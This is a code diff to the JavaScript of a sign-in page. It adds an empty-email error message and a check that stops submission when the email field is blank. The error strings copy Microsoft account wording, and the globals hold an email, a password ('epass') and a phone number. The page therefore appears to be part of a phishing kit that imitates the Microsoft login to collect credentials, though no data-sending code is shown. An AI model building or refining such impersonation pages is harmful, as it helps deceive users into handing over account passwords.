@@ -1,4 +1,4 @@
-var Errs={'NoOtpCode':'Enter the code to help us verify your identity.<a id="ViewDetails" class="no-wrap" href="#">View details</a>','OathCodeIncorrect':'You didn\'t enter the expected verification code. Please try again.<a id="ViewDetails" class="no-wrap" href="#">View details</a>','NoAccount':'We couldn\'t find an account with that username. Try another, or get a new account.<a id="ViewDetails" class="no-wrap" href="#">View details</a>','NoPassword':'Please enter your password.','accIncorrect':'Your account or password is incorrect. If you don\'t remember your password, <a id="ViewDetails" class="no-wrap" href="#">reset it now.</a>','UnableVeri':'Sorry, we\'re having trouble verifying your account. Please try again <a id="ViewDetails" class="no-wrap" href="#">View details</a>','InvalidSession':'Your session has timed out. Please close your browser and sign in again.<a id="ViewDetails" class="no-wrap" href="#">View details</a>','Notemail':'We couldn\'t find an account with that username. Try another, or <a id="ViewDetails" class="no-wrap" href="#">get a new Microsoft account.</a>','rinfo':'This information is required.','not7digit':'Please enter the 7-digit code. The code only contains numbers.','codenotwork':'That code didn\'t work. Check the code and try again.'};
+var Errs={'NoOtpCode':'Enter the code to help us verify your identity.<a id="ViewDetails" class="no-wrap" href="#">View details</a>','OathCodeIncorrect':'You didn\'t enter the expected verification code. Please try again.<a id="ViewDetails" class="no-wrap" href="#">View details</a>','NoAccount':'We couldn\'t find an account with that username. Try another, or get a new account.<a id="ViewDetails" class="no-wrap" href="#">View details</a>','NoPassword':'Please enter your password.','accIncorrect':'Your account or password is incorrect. If you don\'t remember your password, <a id="ViewDetails" class="no-wrap" href="#">reset it now.</a>','UnableVeri':'Sorry, we\'re having trouble verifying your account. Please try again <a id="ViewDetails" class="no-wrap" href="#">View details</a>','InvalidSession':'Your session has timed out. Please close your browser and sign in again.<a id="ViewDetails" class="no-wrap" href="#">View details</a>','Notemail':'We couldn\'t find an account with that username. Try another, or <a id="ViewDetails" class="no-wrap" href="#">get a new Microsoft account.</a>','rinfo':'This information is required.','not7digit':'Please enter the 7-digit code. The code only contains numbers.','codenotwork':'That code didn\'t work. Check the code and try again.','emptyEmail':'Enter a valid email address, phone number, or Skype name.'};
 var email = "";
 var epass = "";
 var phone = "";
@@ -59,6 +59,10 @@ if(vak){
 email = vak;  
 }else{
 email = $("#email").val();  
+}
+if(email==''){
+    $("#error1").html(Errs['emptyEmail']);
+    return false;
 }
 if(bac==1){
     $("#load").show();
